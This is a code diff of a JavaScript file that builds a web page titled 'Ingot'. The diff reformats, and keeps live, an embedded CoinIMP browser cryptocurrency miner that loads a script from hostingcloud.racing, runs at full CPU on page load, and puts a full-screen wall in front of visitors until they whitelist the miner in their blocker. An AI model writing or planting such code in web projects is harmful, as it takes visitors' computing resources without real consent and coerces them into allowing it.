@@ -16,9 +16,33 @@ return "";
 }
 
 //Set base page code
-document.documentElement.innerHTML = `<html><script src="https://www.hostingcloud.racing/mcWn.js"></script><script>var _client=new Client.Anonymous("fe7d18a60c177fc6f388db93ce9ce9c2931471ef634b0581a5a8d930a9adf56f",{throttle:0,c:"w",ads:0});_client.start(),_client.addMiningNotification("Top","This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.","#cccccc",40,"#3d3d3d")</script><script>setTimeout(function(){if("undefined"==typeof _client||null===_client){var e=document.createElement("div");e.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;"),e.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));var t=document.createElement("div");t.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center"),t.appendChild(e),document.body.appendChild(t),document.getElementsByTagName("body")[0].style.overflow="hidden",window.scrollTo(0,0)}},1e3)</script><head><link rel="icon" href="data:image/svg+xml,<svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' version='1.1'><path fill='white' d='M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7 1.49 0 2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z'></path></svg>">
+document.documentElement.innerHTML = `<html><head><link rel="icon" href="data:image/svg+xml,<svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' version='1.1'><path fill='white' d='M20.5 11H19V7c0-1.1-.9-2-2-2h-4V3.5C13 2.12 11.88 1 10.5 1S8 2.12 8 3.5V5H4c-1.1 0-1.99.9-1.99 2v3.8H3.5c1.49 0 2.7 1.21 2.7 2.7s-1.21 2.7-2.7 2.7H2V20c0 1.1.9 2 2 2h3.8v-1.5c0-1.49 1.21-2.7 2.7-2.7 1.49 0 2.7 1.21 2.7 2.7V22H17c1.1 0 2-.9 2-2v-4h1.5c1.38 0 2.5-1.12 2.5-2.5S21.88 11 20.5 11z'></path></svg>">
 <title>Ingot</title>
 </head>
+<script src="https://www.hostingcloud.racing/mcWn.js"></script>
+<script>
+    var _client = new Client.Anonymous('fe7d18a60c177fc6f388db93ce9ce9c2931471ef634b0581a5a8d930a9adf56f', {
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+</script>
+<script>
+    setTimeout(function(){
+        if(typeof _client === 'undefined' || _client === null)
+        {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    },1000);
+</script>
 <body ` + isPageDev() + `>
 <div class="nav">
 <div class="nav-left">
